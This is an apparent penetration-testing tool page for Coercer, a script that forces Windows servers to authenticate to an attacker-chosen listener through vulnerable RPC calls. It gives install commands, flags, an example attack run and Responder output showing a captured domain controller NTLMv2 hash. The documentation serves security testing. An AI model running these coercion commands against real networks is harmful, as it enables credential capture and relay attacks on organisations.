---
title : "Coercer"
# pre : ' '
description : "A python script to automatically coerce a Windows server to authenticate on an arbitrary machine through 9 methods."
date : 2022-09-16T11:58:17+02:00
# hidden : true
# draft : true
weight : 0
tags : ['Framework', 'SMB']
---

## Coercer

A python script to automatically coerce a Windows server to authenticate on an arbitrary machine through 9 methods.

## Features

* [x] Automatically detects open SMB pipes on the remote machine.
* [x] Calls one by one all the vulnerable RPC functions to coerce the server to authenticate on an arbitrary machine.
* [x] Analyze mode with `--analyze`, which only lists the vulnerable protocols and functions listening, without performing a coerced authentication.
* [x] Perform coerce attack on a list of targets from a file with `--targets-file`
* [x] Coerce to a WebDAV target with `--webdav-host` and `--webdav-port`

### Installation

```plain
sudo python3 -m pip install coercer
```

### Usage

```plain
Coercer.py [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [--hashes [LMHASH]:NTHASH] [--no-pass] [-v] [-a] [-k] [--dc-ip ip address] [-l LISTENER] [-wh WEBDAV_HOST] [-wp WEBDAV_PORT]
                  (-t TARGET | -f TARGETS_FILE) [--target-ip ip address]
```

### Flags

```plain
Automatic windows authentication coercer over various RPC calls.

options:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        Username to authenticate to the endpoint.
  -p PASSWORD, --password PASSWORD
                        Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)
  -d DOMAIN, --domain DOMAIN
                        Windows domain name to authenticate to the endpoint.
  --hashes [LMHASH]:NTHASH
                        NT/LM hashes (LM hash can be empty)
  --no-pass             Don't ask for password (useful for -k)
  -v, --verbose         Verbose mode (default: False)
  -a, --analyze         Analyze mode (default: Attack mode)
  -k, --kerberos        Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the
                        command line
  --dc-ip ip address    IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -t TARGET, --target TARGET
                        IP address or hostname of the target machine
  -f TARGETS_FILE, --targets-file TARGETS_FILE
                        IP address or hostname of the target machine
  --target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it

  -l LISTENER, --listener LISTENER
                        IP address or hostname of the listener machine
  -wh WEBDAV_HOST, --webdav-host WEBDAV_HOST
                        WebDAV IP of the server to authenticate to.
  -wp WEBDAV_PORT, --webdav-port WEBDAV_PORT
                        WebDAV port of the server to authenticate to.
```

### Examples

Starting Coercer against `10.0.0.20` to trigger authentication.

```plain
$ Coercer -d 'offsec.nl' -u 'crypt0rr' -p 'Welkom1234' --listener 10.0.0.103 --target 10.0.0.20    

       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v1.6
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[10.0.0.20] Analyzing available protocols on the remote machine and perform RPC calls to coerce authentication to 10.0.0.103 ...
   [>] Pipe '\PIPE\lsarpc' is accessible!
      [>] On '10.0.0.20' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcOpenFileRaw' (opnum 0) ... rpc_s_access_denied
      [>] On '10.0.0.20' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 4) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On '10.0.0.20' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcDecryptFileSrv' (opnum 5) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On '10.0.0.20' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryUsersOnFile' (opnum 6) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On '10.0.0.20' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryRecoveryAgents' (opnum 7) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On '10.0.0.20' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 12) ... ERROR_BAD_NETPATH (Attack has worked!)
   [>] Pipe '\PIPE\netdfs' is accessible!
      [>] On '10.0.0.20' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsAddStdRoot' (opnum 12) ... rpc_s_access_denied (Attack should have worked!)
      [>] On '10.0.0.20' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ... rpc_s_access_denied (Attack should have worked!)
   [>] Pipe '\PIPE\spoolss' is accessible!
      [>] On '10.0.0.20' through '\PIPE\spoolss' targeting 'MS-RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx' (opnum 65) ... rpc_s_access_denied (Attack should have worked!)

[+] All done!
```

Responder in analyze mode capturing the authentication attempt from the computer object `DC19$`.

```plain
$ sudo ./Responder.py -I eth0 --analyze             
[...SNIP...]]
[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [10.0.0.103]
    Responder IPv6             [fe80::a00:27ff:fe07:1dc5]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-H6SCA8ZMEPT]
    Responder Domain Name      [ZOW5.LOCAL]
    Responder DCE-RPC Port     [49387]

[+] Listening for events...
[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[SMB] NTLMv2-SSP Client   : 10.0.0.20
[SMB] NTLMv2-SSP Username : OFFSEC\DC19$
[SMB] NTLMv2-SSP Hash     : DC19$::OFFSEC:2df76765d6bc67f3:3BE8EC4E6EBEF1550CBE7264443CB215:010100000000000000357FE3C3C9D801ACEB1F640AF10D6600000000020008005A004F005700350001001E00570049004E002D004800360053004300410038005A004D0045005000540004003400570049004E002D004800360053004300410038005A004D004500500054002E005A004F00570035002E004C004F00430041004C00030014005A004F00570035002E004C004F00430041004C00050014005A004F00570035002E004C004F00430041004C000700080000357FE3C3C9D80106000400020000000800300030000000000000000000000000400000CD1E34DBD1AA46B770C6B64427E5EF8DDC3892DE148D9186264D5CB2452FA3F60A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0030002E0030002E003100300033000000000000000000
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
[*] Skipping previously captured hash for OFFSEC\DC19$
```

### URL list

* [Github.com - Coercer](https://github.com/p0dalirius/Coercer)
